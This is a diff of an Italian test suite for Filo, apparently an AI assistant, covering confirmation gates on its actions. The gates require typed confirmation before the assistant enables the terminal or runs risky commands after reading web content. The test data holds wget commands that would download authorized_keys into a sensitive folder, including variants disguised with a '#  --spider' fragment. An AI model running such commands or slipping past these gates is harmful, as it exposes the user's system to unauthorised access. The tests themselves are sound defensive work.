@@ -1,9 +1,10 @@
-// #146.2 — Framework dei livelli di sicurezza per le azioni di Filo.
+// #146.2 / #530 — Le azioni di Filo: costo nel registro, risposta da SN_AUTONOMIA.
 //
-// Verifica il contratto della spec: livello 1 esegue subito; livello 2 NON
-// esegue finché l'utente non conferma dal popup; livello 3 richiede di
-// digitare "conferma"; le azioni NON registrate vengono rifiutate dal
-// dispatch (anche se arrivano già "confermate" dal client).
+// Verifica il contratto: quello che non chiede parte subito; quello che chiede
+// NON esegue finché l'utente non conferma dal popup; la «conferma» va digitata
+// quando lo vuole la regola (qui: spegnere una difesa, o un'azione irreversibile
+// dopo aver letto cose scritte da altri); le azioni NON registrate vengono
+// rifiutate dal dispatch (anche se arrivano già "confermate" dal client).
 
 import { test, expect } from './fixtures/electron.mjs';
 import { CONFIRM_HOST, confirmState, confirmText, clickConfirm, fillConfirmInput, mouseClickConfirm, pointWhenConfirmAppears, aspettaConfermaPronta } from './helpers/confirm.mjs';
@@ -21,6 +22,8 @@ const getSettings = (page) =>
 // Il terminale è acceso di serie (#892): le prove che lo accendono partono da spento.
 const spegniTerminale = (page) =>
   page.evaluate(() => chrome.runtime.sendMessage({ type: 'update_settings', settings: { terminal: { enabled: false } } }));
+// Un compito che ha letto una ricerca sul web: a Normale il costo 2 chiede e il 3 vuole «conferma».
+const DOPO_UNA_RICERCA = { contesto: [{ type: 'CERCA_WEB', query: 'x', _output: { results: [{ url: 'https://esempio.test/' }] } }] };
 
 test('livello 1 esegue subito, senza chiedere nulla', async ({ app, openTab }) => {
   const page = await openTab(NEWTAB);
@@ -32,17 +35,18 @@ test('livello 1 esegue subito, senza chiedere nulla', async ({ app, openTab }) =
   expect(timers.some((t) => t.label === 'Pasta')).toBe(true);
 });
 
-test('livello 2 non esegue senza conferma; la conferma esegue davvero', async ({ app, openTab }) => {
+test('accendere il terminale abbassa una difesa: non esegue senza «conferma»; la conferma esegue davvero', async ({ app, openTab }) => {
   const page = await openTab(NEWTAB);
   await spegniTerminale(page);
   const action = { type: 'IMPOSTA_PREFERENZA', chiave: 'terminale', valore: 'on' };
 
-  // Senza conferma: l'azione NON viene eseguita, torna al client con il
-  // livello e la spiegazione per il popup.
+  // Senza conferma: l'azione NON viene eseguita, torna al client con la parola
+  // da digitare e la spiegazione per il box.
   const r = await execAction(app, action);
   expect(r.executed).toBe(false);
   expect(r.kept).toBe(true);
-  expect(r.needsConfirm).toBe(2);
+  expect(r.needsConfirm).toBe(3);
+  expect(r.avviso).toBe('Abbassa una difesa di Filo.');
   expect(r.describe).toContain('erminale');
   expect((await getSettings(page)).terminal?.enabled || false).toBe(false);
 
@@ -224,8 +228,8 @@ test('#479: scaricare dopo essersi spostati in una cartella sensibile chiede "co
   const scarica = { type: 'ESEGUI_COMANDO', comando: 'wget http://esempio.test/authorized_keys' };
 
   // 1) Il download SENZA flag di output — la strada che restava scoperta —
-  //    ora chiede di digitare "conferma" invece del semplice OK.
-  const prima = await execAction(app, scarica);
+  //    costa come le cancellazioni: dopo aver letto altro vuole «conferma».
+  const prima = await execAction(app, scarica, DOPO_UNA_RICERCA);
   expect(prima.executed).toBe(false);
   expect(prima.needsConfirm).toBe(3);
   // 2) …e il popup dice in quale cartella il file andrebbe a finire: nel testo
@@ -236,9 +240,9 @@ test('#479: scaricare dopo essersi spostati in una cartella sensibile chiede "co
   // 3) Lo spostamento resta gratuito (è la primitiva di navigazione
   //    dell'assistente), ma il popup del comando successivo lo RACCONTA: la
   //    cartella scritta nella conferma segue il `cd` appena fatto.
-  const cd = await execAction(app, { type: 'ESEGUI_COMANDO', comando: 'cd ..' });
+  const cd = await execAction(app, { type: 'ESEGUI_COMANDO', comando: 'cd ..' }, DOPO_UNA_RICERCA);
   expect(cd.needsConfirm).toBeFalsy();
-  const dopo = await execAction(app, scarica);
+  const dopo = await execAction(app, scarica, DOPO_UNA_RICERCA);
   expect(dopo.needsConfirm).toBe(3);
   const cartella = (r) => (String(r.describe).match(/Cartella di lavoro: *(\S+)/) || [])[1];
   expect(cartella(prima)).toBeTruthy();
@@ -259,13 +263,13 @@ test('#479: scaricare dopo essersi spostati in una cartella sensibile chiede "co
     'wget "http://esempio.test/authorized_keys#  --spider "',
     'wget --spider http://esempio.test/authorized_keys',
   ]) {
-    const r = await execAction(app, { type: 'ESEGUI_COMANDO', comando });
+    const r = await execAction(app, { type: 'ESEGUI_COMANDO', comando }, DOPO_UNA_RICERCA);
     expect(r.needsConfirm, comando).toBe(3);
   }
 
   // curl senza flag di output stampa a schermo: non fa atterrare niente, resta
   // alla conferma leggera (nessuna frizione aggiunta dove non serve).
-  const stampa = await execAction(app, { type: 'ESEGUI_COMANDO', comando: 'curl http://esempio.test/x' });
+  const stampa = await execAction(app, { type: 'ESEGUI_COMANDO', comando: 'curl http://esempio.test/x' }, DOPO_UNA_RICERCA);
   expect(stampa.needsConfirm).toBe(2);
 });
 
@@ -346,7 +350,7 @@ test('un clic arrivato mentre il riquadro compare non vale come sì; quello dato
     await page.mouse.click(p.x, p.y);
     await page.waitForTimeout(200);
     await expect(page.locator(CONFIRM_HOST), 'un clic arrivato mentre il riquadro compariva l’ha chiuso').toBeVisible();
-    await page.waitForTimeout(500);
+    await aspettaConfermaPronta(page);
     await mouseClickConfirm(page, bottone);
     await expect(page.locator(CONFIRM_HOST)).toHaveCount(0);
     expect(await page.evaluate(() => window.__esito)).toBe(true);
